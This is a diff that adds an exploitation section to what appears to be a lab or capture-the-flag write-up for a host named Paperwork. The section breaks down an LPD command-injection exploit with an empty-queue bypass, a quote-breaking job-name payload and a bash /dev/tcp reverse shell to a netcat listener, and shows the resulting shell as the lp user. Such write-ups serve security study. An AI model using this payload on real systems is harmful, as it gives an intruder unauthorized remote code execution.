@@ -487,7 +487,52 @@ if __name__ == "__main__":
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
 
-## 3. Exploitation
+## 3. Exploitation & Initial Access
+
+### 3.1 Foothold as `lp` via LPD command injection
+
+**Why this step:** The source review exposed an empty-queue bypass and a shell injection in the job-name field. Combining them in a single crafted LPD exchange yields remote code execution as the service account.
+
+**Command (attacker):** Start a listener, then run the exploit.
+
+```bash
+nc -lvnp 4444          # terminal 1
+python3 foothold.py    # terminal 2
+```
+
+**Exploit (`foothold.py`) breakdown:**
+
+- `cmd = bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`: the reverse-shell payload to execute on the target.
+- `job = "'; {cmd}; #"`: closes the single quote in `echo 'Archive: ...'`, runs `cmd`, and comments out the trailing redirect so the shell line stays valid.
+- `control = "Hlocalhost\nPtester\nJ{job}\n"`: an LPD control file; the `J` line is the one the server parses as the job name and feeds to the shell.
+- `s.send(b"\x02\n")`: command byte `0x02` (receive job) with an empty queue name, satisfying the `"" in "archive_intake"` substring check.
+- `header = b"\x02" + len(control) + b" cfA001localhost\n"`: subcommand `0x02` (receive control file) announcing the control-file size and name.
+- `s.send(control)`: delivers the malicious control file, triggering `subprocess.Popen(..., shell=True)` on the target.
+
+**Result (attacker listener):**
+
+```
+listening on [any] 4444 ...
+connect to [10.10.14.68] from (UNKNOWN) [TARGET_IP] 36362
+bash: cannot set terminal process group (989): Inappropriate ioctl for device
+bash: no job control in this shell
+lp@paperwork:/opt/LPDServer$
+```
+
+Script output confirmed both protocol ACKs:
+
+```
+[*] header ACK: b'\x00'
+[*] final ACK: b'\x00'
+[+] Payload sent, check your listener
+```
+
+**What this gives you:**
+
+- Key finding: unauthenticated remote code execution on Paperwork as the `lp` user, landing in `/opt/LPDServer`, the service's working directory.
+- Both source-review findings are confirmed live: the empty-queue substring bypass and the unsanitized job-name command injection.
+
+**Next:** Stabilize the shell, confirm the user context, and enumerate internal services for the lateral-movement path.
 <div align="center">
 <br>
 <br>
